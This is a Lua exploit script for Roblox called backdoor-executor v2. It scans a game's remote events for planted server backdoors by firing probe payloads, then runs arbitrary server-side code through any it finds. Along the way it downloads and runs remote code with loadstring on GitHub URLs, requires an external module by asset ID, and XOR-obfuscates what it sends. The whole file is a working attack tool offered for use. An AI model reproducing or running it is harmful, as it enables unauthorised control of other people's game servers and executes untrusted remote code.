-- services
local httpService = game:GetService("HttpService")
local insertService = game:GetService("InsertService")
local logService = game:GetService("LogService")
local repStorage = game:GetService("ReplicatedStorage")
local runService = game:GetService("RunService")
local starterGui = game:GetService("StarterGui")
-- variables
local config
local execGuiAPI
local remoteRedirectionInitialized = false
local debugSource = [[
local stdout = table.create(512)
local execSucc, result do
	local env = getfenv(0)
	env.print = function(...)
		table.insert(stdout, {0, workspace:GetServerTimeNow(), ...})
	end
	env.warn = function(...)
		table.insert(stdout, {1, workspace:GetServerTimeNow(), ...})
	end
	local function main() %s end

	execSucc, result = pcall(setfenv(main, env))
end

local stdObj = Instance.new("BoolValue")
stdObj.Name, stdObj.Value, stdObj.Parent = "%s", execSucc, game:GetService("InsertService")

stdObj:SetAttribute("stderr", (not execSucc and result or nil))
stdObj:SetAttribute("stdout", (#stdout > 0 and game:GetService("HttpService"):JSONEncode(stdout) or nil))
task.delay(1, stdObj.Destroy, stdObj)
]]
local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s|%s");c(5,b,a,d,nil)]]
local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*()_+{}:"
local remoteInfo = {
	["foundBackdoor"] = false,
	["instance"] = nil,
	["args"] = {"source"},
	["argSrcIndex"] = 1,
	["srcFunc"] = nil
}
local msgOutputs = {
	["outdatedCache"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
	["outdatedConfig"] = "backdoor-executor.lua configuration is outdated! \nIt is recommended to update the configuration to prevent errors.",
	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
	["configCantLoad"] = "Local configuration cannot be loaded, it might be corrupted.",
	["attached"] = "\n Attached Remote: %s\n Type: %s",
	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
	["failedRemoteRedirection"] = "Remote redirection failed to load, using original remote.",
	["printRemote"] = "\n Remote: %s | [%s]\n Type: %s",
	["mainTabText"] = "--[[\n\tbackdoor-executor.lua loaded!\n\tUsing 'github.com/jLn0n/executor-gui' for interface.\n\tDocumentation: https://github.com/jLn0n/scripts/blob/main/backdoor-executor/README.MD\n--]]\n",
}
local stringifiedTypes = {
	EnumItem = function(value)
		return string.format("Enum.%s.%s", value.EnumType, value.Name)
	end,
	CFrame = function(value)
		return string.format("CFrame.new(%s)", tostring(value))
	end,
	Vector3 = function(value)
		return string.format("Vector3.new(%s)", tostring(value))
	end,
	BrickColor = function(value)
		return string.format("BrickColor.new(\"%s\")", value.Name)
	end,
	Color3 = function(value)
		return string.format("Color3.new(%s)", tostring(value))
	end,
	string = function(value)
		return string.format("\"%s\"", value)
	end,
	number = function(value)
		return string.format("%2.f", value)
	end,
	Ray = function(value)
		return string.format("Ray.new(Vector3.new(%s), Vector3.new(%s))", tostring(value.Origin), tostring(value.Direction))
	end
}
-- functions
local get_thread_identity = (syn and syn.get_thread_identity) or getthreadidentity
local set_thread_identity = (syn and syn.set_thread_identity) or setthreadidentity

local _getDebugIdFunc = game.GetDebugId

local function getDebugId(instanceObj)
	local oldThreadIdentity = get_thread_identity()
	set_thread_identity(7)
	local debugId = _getDebugIdFunc(instanceObj)
	set_thread_identity(oldThreadIdentity)
	return debugId
end

local function sendNotification(text)
	return starterGui:SetCore("SendNotification", {
		Title = "[backdoor-executor v2]",
		Text = text,
		Duration = 5
	})
end

local function getFullNameOf(object)
	if not object then return end
	local currentInstance = object
	local result = ""

	while currentInstance ~= game do
		local currentName = (if currentInstance then currentInstance.Name else nil)
		if not currentName then break end

		local concatenatedStr = (
			if (not string.match(currentName, "^[%w_]+$")) then
				`["{currentName}"]`
			else
				`.{currentName}`
		)
		result = concatenatedStr .. result
		currentInstance = currentInstance.Parent
	end
	result = string.sub(result, 2)
	return result
end

local function pathToInstance(strPath)
	if not strPath then return end
	local subPaths do
		subPaths = table.create(0)

		for matchedStr in string.gmatch(strPath, "[^%.]+") do -- TODO: handle ServerScriptService[\"Test 1\"][\"Test 2\"]
			local subPath1 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%1")
			local subPath2 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%2")

			table.insert(subPaths, subPath1)
			if (subPath1 == subPath2 and matchedStr == subPath1) then continue end
			table.insert(subPaths, subPath2)
		end
	end
	local result = game

	for _, pathName in subPaths do
		if not result then return end
		result = result:WaitForChild(pathName, 1) -- yielding go brr
	end
	return result
end

local function mergeArray(t1, t2)
	t1 = table.clone(t1)

	for index, value in t2 do
		value = (if typeof(value) == "table" then table.clone(value) else value)
		table.insert(t1, value)
	end
	return t1
end

local function generateRandString(lenght, lettersOnly)
	local result = ""
	local strTotalLenght = (if lettersOnly then 52 else #stringList)

	for _ = 1, lenght do
		local randInteger = math.random(1, strTotalLenght)
		result ..= string.sub(stringList, randInteger, randInteger)
	end
	return result
end

local function notSameRandNumber(min, max, ...)
	local numIndexes = {...}
	local randNumber = math.random(min, max)

	task.defer(table.clear, numIndexes) -- optimization!?!!?
	return (
		if not table.find(numIndexes, randNumber) then
			randNumber
		else
			notSameRandNumber(min, max, ...)
	)
end

local function waitUntil(waitTime, condition)
	local startTime = os.clock()
	repeat runService.Heartbeat:Wait() until condition() or (os.clock() - startTime) > waitTime
end

local function isRemoteAllowed(object)
	if typeof(object) ~= "Instance" or not (object:IsA("RemoteEvent") or object:IsA("RemoteFunction")) then
		return false
	end

	for filterName, filterFunc in config.remoteFilters do
		if filterFunc and not filterFunc(object) then continue end
		return false
	end
	return true
end

local function getRemotes()
	local remotes = table.create(128)
	local instancesList = mergeArray(
		(if getinstances then getinstances() else table.create(0)),
		(if getnilinstances then getnilinstances() else table.create(0))
	)
	instancesList = mergeArray(game:GetDescendants(), instancesList)

	for _, object in instancesList do
		if not isRemoteAllowed(object) then continue end
		local remoteObjId = getDebugId(object)
		remotes[remoteObjId] = object
	end
	return remotes
end

local function getStringifiedType(value)
	local stringifier = stringifiedTypes[typeof(value)]

	return (
		if stringifier then
			stringifier(value)
		else
			tostring(value)
	)
end

local function applyMacros(source)
	for macroName, macroValue in config.scriptMacros do
		macroValue = getStringifiedType(
			if typeof(macroValue) == "function" then
				macroValue(macroValue)
			else
				macroValue
		)
		source = string.gsub(source, "%%" .. macroName .. "%%", macroValue)
	end
	return source
end

local function getRemoteFunc(remoteObj)
	return (
		if remoteObj:IsA("RemoteEvent") then
			remoteObj.FireServer
		elseif remoteObj:IsA("RemoteFunction") then
			remoteObj.InvokeServer
		else nil
	)
end

local applyRedirectedRemoteSecurity do
	-- simple XOR encryption algorithm, nothing special
	local function XORSource(source: string, key: number): string
		local randomObj = Random.new(key)
		local result = ""

		for idx = 1, #source do
			local charByte = string.byte(source, idx, idx)
			local offset = ((idx % randomObj:NextInteger(0, 96)) + randomObj:NextInteger(0, 16))
			charByte = bit32.bxor(offset, charByte, randomObj:NextInteger(0, 16))

			result ..= string.char(charByte)
		end
		result = string.gsub(result, ".", function(value) return "\\" .. string.byte(value) end)
		return result
	end

	function applyRedirectedRemoteSecurity(source)
		if not config.redirectRemote then return end
		local argsLenght = math.random(12, 32)
		local generatedArgs = table.create(argsLenght)
		local srcArgIdx = math.random(2, (argsLenght - 1))
		local verificationIdx = notSameRandNumber(8, (argsLenght - 2), srcArgIdx)
		local randIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx)
		local nonceIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx, randIdx)
		local XORKey = math.ceil((((argsLenght / randIdx) % verificationIdx) * nonceIdx) * (verificationIdx * srcArgIdx))

		generatedArgs[1] = (
			if (math.random(1, 2) == 2) then
				generateRandString(verificationIdx)
			else verificationIdx
		)
		generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
		generatedArgs[srcArgIdx] = crypt.base64encode(XORSource(source, XORKey))
		generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
		generatedArgs[nonceIdx] = "\127@" .. generateRandString(randIdx + argsLenght) -- generates a nonce that is the lenght of `randIdx`

		for argIndex = 2, argsLenght do -- inserts random jibberish
			if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
			local useString = math.random(1, 2) == 2

			generatedArgs[argIndex] = (if useString then generateRandString(math.random(12, 48)) else math.random(1, 255))
		end

		return generatedArgs
	end
end

local function execScript(source, noRedirectOutput)
	if not remoteInfo.foundBackdoor then return end
	source = applyMacros(source)
	local remoteFunc = getRemoteFunc(remoteInfo.instance)
	local remoteArgs = table.clone(remoteInfo.args)

	if (config.redirectOutput and not noRedirectOutput) then
		local nonce = generateRandString(32)
		source = string.format(debugSource, source, nonce)

		local connection
		connection = insertService.ChildAdded:Connect(function(object)
			if object.Name ~= nonce then return end connection:Disconnect()

			local rawStdout = object:GetAttribute("stdout")
			local jsonConverted, stdout = pcall(httpService.JSONDecode, httpService, rawStdout)
			if not (jsonConverted and typeof(stdout) == "table") then return end

			for _, output in stdout do
				local outputType, timestamp = (
					if output[1] == 0 then
						Enum.MessageType.MessageOutput
					elseif output[1] == 1 then
						Enum.MessageType.MessageWarning
					else nil
				), output[2]
				output = table.concat(output, " ", 3)

				execGuiAPI.console.createOutput(output, outputType, timestamp)
			end

			if not object.Value then
				execGuiAPI.console.createOutput(object:GetAttribute("stderr"), Enum.MessageType.MessageError)
			end
		end)
		task.delay(60, connection.Disconnect, connection)
	end

	source = (if remoteInfo.srcFunc then remoteInfo.srcFunc(source) else source)
	if (config.redirectRemote and remoteRedirectionInitialized) then
		remoteArgs = applyRedirectedRemoteSecurity(source)
	else
		remoteArgs[remoteInfo.argSrcIndex] = source
	end
	task.spawn(remoteFunc, remoteInfo.instance, unpack(remoteArgs))
end

local function initializeRemoteInfo(params, overwriteRemoteInfo)
	if (remoteInfo.foundBackdoor and not overwriteRemoteInfo) then return end

	remoteInfo.foundBackdoor = true
	for name, value in params do
		remoteInfo[name] = value
	end
end

local function initRemoteRedirection()
	if not (remoteInfo.foundBackdoor and (config.redirectRemote and not remoteRedirectionInitialized)) then return false end
	local nonce = generateRandString(32, true)

	execScript(`require(11906423264)("{nonce}", %userid%)`, true) -- if you wanna try out new features, put 11906414795 as the requireId
	-- we need to improvise until :WaitForAttribute is added
	waitUntil(5, function() return insertService:GetAttribute(nonce) end)
	local redirectedRemotePath = insertService:GetAttribute(nonce)

	if not redirectedRemotePath then return warn(msgOutputs.failedRemoteRedirection) end
	local redirectedRemote = pathToInstance(redirectedRemotePath)

	if redirectedRemote and
		redirectedRemote:IsA("RemoteEvent") and
		redirectedRemote:GetAttribute("isNonced")
	then
		remoteRedirectionInitialized = true

		initializeRemoteInfo({
			["instance"] = redirectedRemote,
			["args"] = {"source"},
			["argSrcIndex"] = 1
		}, true)

		insertService:GetAttributeChangedSignal(nonce):Connect(function()
			local newPath = insertService:GetAttribute(nonce)
			if not newPath then return end
			local newRemote = pathToInstance(newPath)

			if newRemote and
				newRemote:IsA("RemoteEvent") and
				newRemote:GetAttribute("isNonced")
			then
				remoteInfo.instance = newRemote
			end
		end)
		return true
	else
		warn(msgOutputs.failedRemoteRedirection)
		return false
	end
end

local function onAttached(remoteInfoParams)
	if (remoteInfo.foundBackdoor and remoteInfo.instance) then return end
	getgenv().__BEXELUAATTACHED = true
	initializeRemoteInfo(remoteInfoParams)
	sendNotification("Attached!")
	warn(string.format(msgOutputs.attached, getFullNameOf(remoteInfoParams.instance), remoteInfoParams.instance.ClassName))
	initRemoteRedirection()

	execGuiAPI = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/executor-gui/main/src/loader.lua"))({
		customMainTabText = msgOutputs.mainTabText,
		customExecution = true,
		executeFunc = function(source) return execScript(source) end,
	})

	for _, scriptSrc in config.autoExec do
		execScript(scriptSrc)
	end
end

local function scanBackdoors()
	if remoteInfo.foundBackdoor then return end
	local remotesList = getRemotes()
	local nonce = generateRandString(32, true)

	local connection;
	connection = logService.AttributeChanged:Connect(function(attributeName)
		if attributeName ~= nonce then return end connection:Disconnect()
		local remoteResult = string.split(logService:GetAttribute(nonce), "|")
		local remoteObj = remotesList[remoteResult[1]]
		local payloadInfo = config.backdoorPayloads[remoteResult[2]]

		task.spawn(onAttached, {
			["instance"] = remoteObj,
			["args"] = payloadInfo.Args,
			["argSrcIndex"] = table.find(payloadInfo.Args, "source")
		})
	end)

	local function testRemote(remoteObj, remoteObjId)
		local remoteObjFunc = getRemoteFunc(remoteObj)

		for payloadName, payloadInfo in config.backdoorPayloads do runService.Heartbeat:Wait()
			local remotePassed = (if payloadInfo.Verifier then payloadInfo.Verifier(remoteObj) else true)
			if (not remotePassed or not payloadInfo.Args) then continue end

			local currentPayload = table.clone(payloadInfo.Args)
			local argSrcIdx = table.find(currentPayload, "source")
			if not argSrcIdx then continue end

			currentPayload[argSrcIdx] = string.format(sourcePayload, nonce, remoteObjId, payloadName)
			pcall(task.spawn, remoteObjFunc, remoteObj, unpack(currentPayload))
		end
		-- this attempts to parent the remote to replicatedstorage if remote is parented to nil
		-- because if the remote is parented to nil, firing/invoking the remote will be voided
		if not game:IsAncestorOf(remoteObj) then
			pcall(function()
				remoteObj.Parent = repStorage
				runService.PreAnimation:Wait()
				remoteObj.Parent = nil
			end)
		end
	end

	for remoteObjId, remoteObj in remotesList do runService.Heartbeat:Wait()
		if remoteInfo.foundBackdoor then break end

		print(string.format(msgOutputs.printRemote, getFullNameOf(remoteObj), remoteObjId, remoteObj.ClassName))
		task.spawn(testRemote, remoteObj, remoteObjId)
	end

	waitUntil(2.5, function() return not connection.Connected end)
	task.defer(connection.Disconnect, connection)
end
-- main
do -- config initialization
	local rawConfigFile = (
		if isfile("bexe-config.lua") then
			readfile("bexe-config.lua")
		else
			game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")
	)
	local succ, loadedConfig do
		succ, loadedConfig = pcall(loadstring(rawConfigFile))

		if (not succ) then
			warn(msgOutputs.configCantLoad)
			rawConfigFile = game:HttpGetAsync("https://raw.githubusercontent.com/jLn0n/scripts/main/backdoor-executor/bexe-config.lua")

			loadedConfig = loadstring(rawConfigFile)()
		end
	end
	local successCount = 0

	successCount += (if typeof(loadedConfig.autoExec) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.remoteFilters) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.scriptMacros) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.backdoorPayloads) == "table" then 1 else 0)
	successCount += (if typeof(loadedConfig.cachedPlaces) == "table" then 1 else 0)

	if (loadedConfig.configVer < 7 or successCount < 5) then warn(msgOutputs.outdatedConfig) end
	config = loadedConfig
end
do -- backdoor finding
	if not getgenv().__BEXELUAATTACHED then
		local placeCacheData = config.cachedPlaces[game.PlaceId]

		if placeCacheData then
			local successCount = 0
			local remoteObj = (if typeof(placeCacheData.Remote) == "string" then pathToInstance(placeCacheData.Path) else placeCacheData.Path)
			local argSrcIndex = (typeof(placeCacheData.Args) == "table" and table.find(placeCacheData.Args, "source"))

			successCount += (if typeof(remoteObj) == "Instance" then 1 else 0)
			successCount += (if (successCount == 1 and (remoteObj:IsA("RemoteEvent") or remoteObj:IsA("RemoteFunction"))) then 1 else 0)
			successCount += (if argSrcIndex then 1 else 0)

			if successCount >= 3 then
				onAttached({
					["instance"] = remoteObj,
					["srcFunc"] = placeCacheData.SourceFunc,
					["args"] = placeCacheData.Args,
					["argSrcIndex"] = argSrcIndex
				})
			else
				warn(string.format(msgOutputs.outdatedCache, game.PlaceId))
			end
		else
			local startTime = os.clock()

			sendNotification("Press F9 to see the remotes being scanned.")
			scanBackdoors()
			warn(string.format(msgOutputs.scanBenchmark, os.clock() - startTime))
		end

		if not remoteInfo.foundBackdoor then -- if no backdoor found
			warn(msgOutputs.noBackdoorRemote)
			sendNotification(msgOutputs.noBackdoorRemote)
		end
	else
		sendNotification("Already attached!")
	end
end
